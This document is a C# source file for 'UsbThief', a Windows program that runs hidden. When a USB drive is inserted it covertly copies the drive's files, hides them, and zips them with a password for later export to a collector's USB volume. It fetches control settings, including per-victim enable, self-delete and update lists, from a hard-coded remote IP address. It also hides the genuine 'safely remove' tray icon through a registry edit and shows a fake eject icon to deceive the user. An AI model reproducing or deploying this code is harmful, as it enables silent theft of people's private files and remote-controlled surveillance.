﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Ionic.Zip;
using Microsoft.Win32;
using Newtonsoft.Json;
using NLog;
using NHotkey;
using NHotkey.WindowsForms;

namespace UsbThief
{
    public partial class Form1 : Form
    {
        #region 声明变量
        public const bool dbg = false;//调试时改为true
        public const int innerVer = 9;
        public bool enable = false;
        public bool fC2C = false;
        public bool inDelay = false;
        public string gUID;
        public string workspace = Application.StartupPath + @"\data\diskcache\files\";
        public const int WM_DEVICECHANGE = 0x219;//Notifies an application of a change to the hardware configuration of a device or the computer.
        public const int DBT_DEVICEARRIVAL = 0x8000;  //A device or piece of media has been inserted and is now available.
        public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //Permission is requested to remove a device or piece of media. Any application can deny this request and cancel the removal.
        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //A request to remove a device or piece of media has been canceled.
        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //A device or piece of media has been removed.
        public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //A device or piece of media is about to be removed. Cannot be denied.
        public static Logger logger = null;
        public LogForm form = new LogForm();
        public SynchronizationContext mainThreadSyncContext;
        public Config conf = new Config();
        public UsbDevice currentDevice = new UsbDevice { name = "none", volLabel = "none", ser = "none" };
        public Status sta = Status.none;
        public System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer() { Interval = 600000 /*30000*//*30秒的调试用*/};
        public enum Status
        {
            none,
            copying,
            compressing,
            exporting,
            exported
        }
        public struct Config
        {
            public int latestVer;
            public string update;
            public List<string> enabledList;
            public List<string> suicideList;
            public List<string> blacklist;
            public List<string> extList;
            public int sizeLim;
            public int delay;
            public string passwd;
            public string exportVol;
            public string exportPath;
        }
        public struct UsbDevice
        {
            public string name;
            public string volLabel;
            public string ser;
        }
        #endregion
        #region 初始化
        public Form1()
        {
            string[] args = Environment.GetCommandLineArgs();//作用相当于输入参数的string数组
            if (args.Length < 2 || args[1] != "-run" || Process.GetProcessesByName("diskmanagement").Length > 1)
                Environment.Exit(0);
            InitializeComponent();
            form.Show();
            form.Hide();
            logger.Info("UsbThief正在初始化……");
            logger.Info("启动目录：" + Application.StartupPath);
            logger.Info("内部版本号：" + innerVer);
            try
            {
                if (File.Exists(Application.StartupPath + "\\GUID"))
                {
                    StreamReader sr = new StreamReader(Application.StartupPath + "\\GUID", Encoding.UTF8);
                    gUID = /*new Guid(*/sr.ReadLine()/*).ToString()*/;
                    sr.Close();
                }
                else
                {
                    FileStream fs1 = new FileStream(Application.StartupPath + "\\GUID", FileMode.Create, FileAccess.Write);
                    StreamWriter sw = new StreamWriter(fs1);
                    gUID = Guid.NewGuid().ToString();
                    sw.WriteLine(gUID);
                    sw.Close();
                    fs1.Close();
                }
            }
            catch (Exception e)
            {
                logger.Error("读取或写入GUID异常：\n" + e);
            }
            logger.Info("GUID：" + gUID);
            mainThreadSyncContext = SynchronizationContext.Current;
            timer.Tick += Timer_Tick;
            timer.Start();
            notifyIcon1.MouseUp += NotifyIcon1_MouseUp;
            notifyIcon1.ContextMenuStrip.Items[0].Click += Item0_Click;
            notifyIcon1.ContextMenuStrip.Items[2].Click += Item2_Click;
            try
            {
                HotkeyManager.Current.AddOrReplace("ShowLogForm", Keys.Shift | Keys.Control | Keys.Alt | Keys.L, ShowLogForm);
            }
            catch (Exception e)
            {
                logger.Info("注册热键失败：\n" + e);
            }
            try
            {
                if (!Directory.Exists(workspace))
                    Directory.CreateDirectory(workspace);
            }
            catch (Exception e)
            {
                logger.Error("无法创建工作区目录：\n" + e);
            }
            HideFiles(workspace);
            GetConf();
            if (enable)
            {
                Dictionary<string, string> devices = ReadSta();
                if (devices != null)
                {
                    foreach (var item in devices)
                    {
                        if (item.Value == Status.copying.ToString() || item.Value == Status.compressing.ToString())
                        {
                            Thread compT = new Thread(new ParameterizedThreadStart(Compress));
                            compT.Start(item.Key);
                        }
                    }
                }
            }
        }
        #endregion
        #region 窗口加载
        private void Form1_Load(object sender, EventArgs e)
        {
            logger.Info("窗口已加载");
            SetVisibleCore(false);
            logger.Info("窗口已隐藏");
        }
        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(value);
        }
        #endregion
        #region 计时器
        private void Timer_Tick(object sender, EventArgs e)
        {
            GetConf();
        }
        #endregion
        #region 获取网络配置
        private void GetConf()
        {
            if ((sta != Status.none && sta != Status.exported) || inDelay)
            {
                if (inDelay)
                {
                    logger.Info("当前处于延迟期间，将不会获取网络配置");
                }
                else
                {
                    logger.Info("任务“" + sta.ToString() + "”正在进行，将不会获取网络配置");
                }
                return;
            }
            try
            {
                using (WebClient client = new WebClient
                {
                    Encoding = Encoding.UTF8
                })
                {
                    if (dbg)
                    {
                        string text = client.DownloadString("http://111.231.202.181/config_debug.txt");
                        logger.Info("获取到网络配置（调试）：\n" + text);
                        conf = JsonConvert.DeserializeObject<Config>(text);
                    }
                    else
                    {
                        string text = client.DownloadString("http://111.231.202.181/config.txt");
                        logger.Info("获取到网络配置：\n" + text);
                        conf = JsonConvert.DeserializeObject<Config>(text);
                    }
                }
            }
            catch (Exception e)
            {
                logger.Error("获取网络配置失败：\n" + e);
            }
            if (conf.enabledList != null)
            {
                foreach (var item in conf.enabledList)
                {
                    if (item == gUID)
                    {
                        enable = true;
                        break;
                    }
                    else
                        enable = false;
                }
            }
            if (conf.suicideList != null)
            {
                foreach (var item in conf.suicideList)
                {
                    if (item == gUID)
                    {
                        try
                        {
                            logger.Info("Bye World~");
                            Process.Start(Application.StartupPath + "\\fileassistant.exe", "-suicide");
                            Environment.Exit(0);
                        }
                        catch (Exception e)
                        {
                            logger.Error("这年头去世都费劲：\n" + e);
                        }
                    }
                }
            }
            if (innerVer < conf.latestVer && conf.update != null && conf.update != "")
            {
                try
                {
                    logger.Info("检测到新版本，即将启动助手程序");
                    Process.Start(Application.StartupPath + "\\fileassistant.exe", "-update=" + conf.update);
                    Environment.Exit(0);
                }
                catch (Exception e)
                {
                    logger.Error("更新失败：\n" + e);
                }
            }
            if (!enable)
                logger.Info("部分功能已关闭");
        }
        #endregion
        #region 托盘图标相关
        private void NotifyIcon1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                MethodInfo mi = typeof(NotifyIcon).GetMethod("ShowContextMenu", BindingFlags.Instance | BindingFlags.NonPublic);
                mi.Invoke(notifyIcon1, null);
            }
        }
        private void Item0_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("control", "printers");
                logger.Info("一本正经地打开控制面板，原来真有人会按这个键");
            }
            catch (Exception ex)
            {
                logger.Error("无法打开控制面板：\n" + ex);
            }
        }
        private void Item2_Click(object sender, EventArgs e)
        {
            //假装弹出
            notifyIcon1.ShowBalloonTip(5000);
            Thread.Sleep(5000);
            notifyIcon1.Visible = false;
            logger.Info("用户以为他弹出了设备，其实并没有~");
        }
        #endregion
        #region 显示日志窗口
        private void ShowLogForm(object sender, HotkeyEventArgs e)
        {
            form.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            form.Size = new System.Drawing.Size { Width = 500, Height = 500 };
            form.Show();
            //form.WindowState = FormWindowState.Normal;
            form.Activate();
            logger.Info("已显示日志窗口");
        }
        #endregion
        #region 监听Usb插入消息
        protected override void WndProc(ref Message m)
        {
            try
            {
                if (m.Msg == WM_DEVICECHANGE && enable)
                {
                    int wp = m.WParam.ToInt32();
                    if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
                    {
                        if (wp == DBT_DEVICEARRIVAL)
                        {
                            if (inDelay)
                            {
                                //不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
                                logger.Info("当前处于延迟期间，将不会处理新设备");
                                return;
                            }
                            Thread copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
                            DriveInfo[] s = DriveInfo.GetDrives();
                            foreach (DriveInfo drive in s)
                            {
                                if (drive.DriveType == DriveType.Removable)
                                {
                                    bool newDevice = false;
                                    Thread th = new Thread(() =>
                                    {
                                        if (currentDevice.name == "none" && currentDevice.volLabel == "none" && currentDevice.ser == "none" && (sta != Status.exporting || sta != Status.compressing))
                                        {
                                            string ser = GetDriveSer(drive.Name);
                                            if (ser != null)
                                            {
                                                if (conf.blacklist != null)
                                                {
                                                    string label = drive.VolumeLabel;
                                                    foreach (var item in conf.blacklist)
                                                    {
                                                        if (item == label && item != "")
                                                            return;
                                                    }
                                                }
                                                currentDevice.name = drive.Name;
                                                currentDevice.volLabel = drive.VolumeLabel;
                                                currentDevice.ser = GetDriveSer(drive.Name);
                                                newDevice = true;
                                                logger.Info("USB设备“" + currentDevice.ser + "”已插入");
                                            }
                                        }
                                    });
                                    th.Start();
                                    th.Join();//等待获取盘符结束再继续
                                    if (newDevice)
                                    {
                                        HideRealMenu();
                                        if (currentDevice.volLabel != "")
                                        {
                                            notifyIcon1.ContextMenuStrip.Items[3].Text = " - " + currentDevice.volLabel + " (" + currentDevice.name.Replace("\\", "") + ")";
                                        }
                                        else
                                        {
                                            notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
                                        }
                                        notifyIcon1.Visible = true;
                                        if (drive.VolumeLabel != conf.exportVol)
                                        {
                                            string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
                                            if (conf.delay > 0 && conf.delay <= 300)
                                            {
                                                logger.Info("复制将于" + conf.delay + "秒后开始");
                                                Delay(conf.delay * 1000);
                                                if (currentDevice.name == "none" && currentDevice.volLabel == "none" && currentDevice.ser == "none")
                                                {
                                                    logger.Info("在延迟期间Usb设备已拔出");
                                                    return;
                                                }
                                            }
                                            WriteSta(currentDevice.ser, Status.copying);
                                            copyT.Start(para);
                                        }
                                        else
                                        {
                                            logger.Info("目标Usb设备“" + drive.VolumeLabel + "”已插入，不会对其进行复制操作");
                                            Thread ex = new Thread(() =>
                                            {
                                                try
                                                {
                                                    //第二个bool指的是是否强制导出，如果之前导出过程中设备拔出导致状态停留在exporting，那么就强制导出
                                                    Dictionary<string, string> d = ReadSta();
                                                    Dictionary<string, bool> devices = new Dictionary<string, bool>();
                                                    if (d == null)
                                                        return;
                                                    foreach (var item in d)
                                                    {
                                                        string tmpSer = item.Key;
                                                        string status = item.Value;
                                                        if (status == Status.none.ToString() && !devices.ContainsKey(tmpSer))
                                                        {
                                                            devices.Add(tmpSer, false);
                                                        }
                                                        else if (status == Status.exporting.ToString() && !devices.ContainsKey(tmpSer))
                                                        {
                                                            devices.Add(tmpSer, true);
                                                        }
                                                    }
                                                    string path = currentDevice.name + conf.exportPath;
                                                    if (!Directory.Exists(path))
                                                        Directory.CreateDirectory(path);
                                                    string[] files = Directory.GetFiles(workspace, "*.zip");
                                                    foreach (var file in files)
                                                    {
                                                        foreach (var item in devices)
                                                        {
                                                            if (file.Substring(file.LastIndexOf("\\") + 1) == item.Key + ".zip")
                                                            {
                                                                string tar;
                                                                if (path.EndsWith("\\"))
                                                                {
                                                                    tar = path + item.Key + ".zip";
                                                                }
                                                                else
                                                                {
                                                                    tar = path + "\\" + item.Key + ".zip";
                                                                }
                                                                if (File.Exists(tar))
                                                                {
                                                                    FileInfo fi1 = new FileInfo(file);
                                                                    FileInfo fi2 = new FileInfo(tar);
                                                                    if (fi1.LastWriteTime > fi2.LastWriteTime || item.Value == true)
                                                                    {
                                                                        WriteSta(item.Key, Status.exporting);
                                                                        logger.Info("正在导出文件：" + file);
                                                                        File.Copy(file, tar, true);
                                                                        if (File.Exists(file))
                                                                            File.Delete(file);
                                                                        WriteSta(item.Key, Status.exported);
                                                                        logger.Info("导出完成：" + tar);
                                                                    }
                                                                    else
                                                                    {
                                                                        WriteSta(item.Key, Status.exported);
                                                                    }
                                                                }
                                                                else
                                                                {
                                                                    WriteSta(item.Key, Status.exporting);
                                                                    logger.Info("正在导出文件：" + file);
                                                                    File.Copy(file, tar, true);
                                                                    if (File.Exists(file))
                                                                        File.Delete(file);
                                                                    WriteSta(item.Key, Status.exported);
                                                                    logger.Info("导出完成：" + tar);
                                                                }
                                                            }
                                                        }
                                                    }
                                                    notifyIcon1.ShowBalloonTip(5000);
                                                    Thread.Sleep(5000);
                                                    notifyIcon1.Visible = false;
                                                }
                                                catch (Exception e)
                                                {
                                                    logger.Error("文件导出失败：\n" + e);
                                                }
                                            });
                                            ex.Start();
                                        }
                                    }
                                    break;
                                }
                            }
                        }
                        else
                        {
                            DriveInfo[] ds = DriveInfo.GetDrives();
                            bool exist = false;
                            foreach (DriveInfo drive in ds)
                            {
                                if (drive.Name == currentDevice.name)
                                    exist = true;
                                continue;
                            }
                            if (!exist && currentDevice.name != "none" && currentDevice.volLabel != "none" && currentDevice.ser != "none")
                            {
                                logger.Info("Usb设备“" + currentDevice.ser + "”已拔出");
                                currentDevice.name = "none";
                                currentDevice.volLabel = "none";
                                currentDevice.ser = "none";
                                notifyIcon1.Visible = false;
                                HideRealMenu(true);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                logger.Error("发生异常：\n" + ex);
            }
            base.WndProc(ref m);
        }
        void Delay(int time_ms)//使用这个延迟方法，假的托盘图标可以正常使用。
        {
            inDelay = true;
            DateTime last = DateTime.Now;
            do
            {
                Application.DoEvents();
                Thread.Sleep(10);
                if (IsDisposed)
                {
                    break;
                }
            } while ((DateTime.Now - last).TotalMilliseconds < time_ms);
            inDelay = false;
        }
        #endregion
        #region 读状态文件
        private Dictionary<string, string> ReadSta()
        {
            try
            {
                if (!File.Exists(Application.StartupPath + "\\status"))
                {
                    FileStream fs1 = new FileStream(Application.StartupPath + "\\status", FileMode.Create, FileAccess.Write);
                    fs1.Close();
                }
                Dictionary<string, string> devices = new Dictionary<string, string>();
                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    string tmpSer = line.Split(':')[0];
                    string status = line.Split(':')[1];
                    if (!devices.ContainsKey(tmpSer))
                        devices.Add(tmpSer, status);
                }
                sr.Close();
                return devices;
            }
            catch (Exception)
            {
                logger.Info("读取状态文件失败");
                return null;
            }
        }
        #endregion
        #region 写状态文件
        private void WriteSta(string ser, Status s)
        {
            sta = s;
            try
            {
                Dictionary<string, string> devices = new Dictionary<string, string>();
                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    string tmpSer = line.Split(':')[0];
                    string status = line.Split(':')[1];
                    if (tmpSer == ser)
                    {
                        continue;
                    }
                    devices.Add(tmpSer, status);
                }
                sr.Close();
                devices.Add(ser, s.ToString());
                FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.Create);
                StreamWriter sw = new StreamWriter(fs);
                foreach (var item in devices)
                {
                    sw.WriteLine(item.Key + ":" + item.Value);
                }
                sw.Close();
            }
            catch (Exception)
            {
                try
                {
                    FileStream fs = new FileStream(Application.StartupPath + "\\status", FileMode.OpenOrCreate);
                    StreamWriter sw = new StreamWriter(fs);
                    sw.WriteLine(ser + ":" + s.ToString());
                    sw.Close();
                }
                catch (Exception e)
                {
                    logger.Info("写入状态失败：\n" + e);
                }
            }
        }
        #endregion
        #region 隐藏文件
        private void HideFiles(string path)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    DirectoryInfo d = new DirectoryInfo(path);
                    FileSystemInfo[] fsinfos = d.GetFileSystemInfos();
                    foreach (FileSystemInfo fsinfo in fsinfos)
                    {
                        File.SetAttributes(fsinfo.FullName, FileAttributes.Hidden);
                        if (fsinfo is DirectoryInfo)     //判断是否为文件夹
                        {
                            HideFiles(fsinfo.FullName);//递归调用
                        }
                    }
                }
            }
            catch (Exception e)
            {
                logger.Error("无法将工作目录设为隐藏：\n" + e);
            }
        }
        #endregion
        #region 隐藏/显示“安全弹出”托盘图标
        private void HideRealMenu(bool show = false)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Applets\SysTray", true);
                if (show)
                {
                    logger.Info("尝试显示安全弹出托盘图标");
                    key.DeleteValue("Services", false);
                }
                else
                {
                    logger.Info("尝试隐藏安全弹出托盘图标");
                    key.SetValue("Services", 29, RegistryValueKind.DWord);
                }
                Process.Start("systray");
                logger.Info("安全弹出托盘图标已隐藏/显示");
            }
            catch (Exception e)
            {
                logger.Info("安全弹出托盘图标无法隐藏/显示：\n" + e);
            }
        }
        #endregion
        #region 获取Usb设备序列号
        private string GetDriveSer(string driName)
        {
            using (ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + driName.Replace("\\", "") + "\""))
            {
                try
                {
                    return disk.Properties["VolumeSerialNumber"].Value.ToString();
                }
                catch (Exception e)
                {
                    logger.Error("设备序列号获取失败：\n" + e);
                    return null;
                }
            }
        }
        #endregion
        #region 获取剩余磁盘空间与计算文件夹大小
        private long GetFreeSpace()
        {
            long freeSpace = 0;
            string str = Application.StartupPath.Substring(0, 3);
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (var drive in drives)
            {
                if (drive.Name == str)
                {
                    freeSpace = drive.TotalFreeSpace;
                    break;
                }
            }
            return freeSpace;
        }
        private long GetDirectoryLength(string dirPath)
        {
            //判断给定的路径是否存在,如果不存在则退出
            if (!Directory.Exists(dirPath))
                return 0;
            long len = 0;
            //定义一个DirectoryInfo对象
            DirectoryInfo di = new DirectoryInfo(dirPath);
            //通过GetFiles方法,获取di目录中的所有文件的大小
            foreach (FileInfo fi in di.GetFiles())
            {
                len += fi.Length;
            }
            //获取di中所有的文件夹,并存到一个新的对象数组中,以进行递归
            DirectoryInfo[] dis = di.GetDirectories();
            if (dis.Length > 0)
            {
                for (int i = 0; i < dis.Length; i++)
                {
                    len += GetDirectoryLength(dis[i].FullName);
                }
            }
            return len;
        }
        #endregion
        #region 检测扩展名
        private bool CheckExt(string ext)
        {
            if (conf.extList == null || conf.extList.Count == 0)
            {
                return true;
            }
            else
            {
                foreach (var item in conf.extList)
                {
                    if (item.ToLower() == ext.ToLower())
                    {
                        return true;
                    }
                }
                return false;
            }
        }
        #endregion
        #region 复制文件
        private void Copy2Disk(object obj)
        {
            string[] str = (string[])obj;
            fC2C = false;
            WriteSta(str[0], Status.copying);
            CopyLoop(str[1], str[2]);
            HideFiles(workspace);
            mainThreadSyncContext.Post(new SendOrPostCallback(CopyDoneCallback), null);
        }
        private void CopyLoop(string sourcePath, string targetPath)
        {
            DirectoryInfo sourceInfo = new DirectoryInfo(sourcePath);
            if (!Directory.Exists(targetPath))
                Directory.CreateDirectory(targetPath);
            foreach (FileSystemInfo fsi in sourceInfo.GetFileSystemInfos())
            {
                string targetFileName = Path.Combine(targetPath, fsi.Name);
                if (fsi is FileInfo)
                {   //如果是文件，复制文件
                    FileInfo fi1 = new FileInfo(fsi.FullName);
                    if (CheckExt(fi1.Extension))
                    {
                        if (File.Exists(targetFileName))
                        {
                            FileInfo fi2 = new FileInfo(targetFileName);
                            if (fi1.LastWriteTime > fi2.LastWriteTime)
                            {
                                logger.Info("正在复制文件：" + fsi.FullName);
                                string path = workspace + currentDevice.ser;
                                string dest = path + ".zip";
                                if (File.Exists(dest))
                                    File.Delete(dest);
                                if (GetDirectoryLength(path) + fi1.Length > GetFreeSpace())
                                {
                                    logger.Info("剩余磁盘空间不足，将不会复制此文件");
                                    continue;
                                }
                                fC2C = true;
                                try
                                {
                                    File.Copy(fsi.FullName, targetFileName, true);
                                }
                                catch (Exception e)
                                {
                                    logger.Error("文件复制出错：\n" + e);
                                }
                            }
                        }
                        else
                        {
                            if (fi1.Length <= conf.sizeLim * (long)1048576 || conf.sizeLim == 0)
                            {
                                logger.Info("正在复制文件：" + fsi.FullName);
                                string path = workspace + currentDevice.ser;
                                string dest = path + ".zip";
                                if (File.Exists(dest))
                                    File.Delete(dest);
                                if (GetDirectoryLength(path) + fi1.Length > GetFreeSpace())
                                {
                                    logger.Info("剩余磁盘空间不足，将不会复制此文件");
                                    continue;
                                }
                                fC2C = true;
                                try
                                {
                                    File.Copy(fsi.FullName, targetFileName, true);
                                }
                                catch (Exception e)
                                {
                                    logger.Error("文件复制出错：\n" + e);
                                }
                            }
                        }
                    }
                }
                else //如果是文件夹，新建文件夹，递归
                {
                    CopyLoop(fsi.FullName, targetFileName);
                }
            }
        }
        private void CopyDoneCallback(object state)
        {
            logger.Info("复制完成");
            if (fC2C)
            {
                logger.Info("压缩线程启动");
                Thread compT = new Thread(new ParameterizedThreadStart(Compress));
                compT.Start(currentDevice.ser);
            }
            else
            {
                WriteSta(currentDevice.ser, Status.none);
            }
        }
        #endregion
        #region 压缩文件
        private void Compress(object s)
        {
            string ser = (string)s;
            WriteSta(ser, Status.compressing);
            try
            {
                string path = workspace + ser;
                string dest = path + ".zip";
                if (File.Exists(dest))
                    File.Delete(dest);
                if (GetDirectoryLength(path) > GetFreeSpace())
                {
                    logger.Info("剩余磁盘空间不足，将不会压缩");
                    return;
                }
                logger.Info("正在压缩：" + path);
                using (ZipFile zip = new ZipFile(dest, Encoding.UTF8))
                {
                    string passwd = "UsbThief";
                    if (conf.passwd != null && conf.passwd != "")
                        passwd = conf.passwd;
                    zip.Password = passwd;
                    zip.AddDirectory(path, ser);
                    zip.Save();
                }
                File.SetAttributes(dest, FileAttributes.Hidden);
            }
            catch (Exception e)
            {
                logger.Error("压缩失败：\n" + e);
            }
            WriteSta(ser, Status.none);
            logger.Info("压缩完成");
        }
        #endregion
    }
}
